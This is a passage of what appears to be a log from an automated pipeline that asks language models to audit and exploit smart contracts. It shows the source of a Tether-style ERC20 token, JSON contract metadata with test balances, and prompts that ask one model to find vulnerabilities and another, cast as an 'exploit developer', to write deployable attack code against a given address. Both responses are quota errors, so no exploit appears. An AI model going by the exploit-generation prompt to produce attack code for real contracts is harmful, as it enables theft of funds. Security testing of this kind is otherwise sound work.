}\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'contract_analysis': '', 'vulnerability_assessment': '', 'exploitation_requirements': '', 'analysis_duration': 1.9496078491210938}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: \n\nVulnerability Assessment: \n\nExploitation Requirements: \n\n\nTarget Contract Address: 0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'code': '', 'code_type': 'solidity', 'attack_duration': 1.8240580558776855}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpesvbax3_.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0x0E696947A06550DEf604e82C26fd9E493e576337",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0E696947A06550DEf604e82C26fd9E493e576337": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    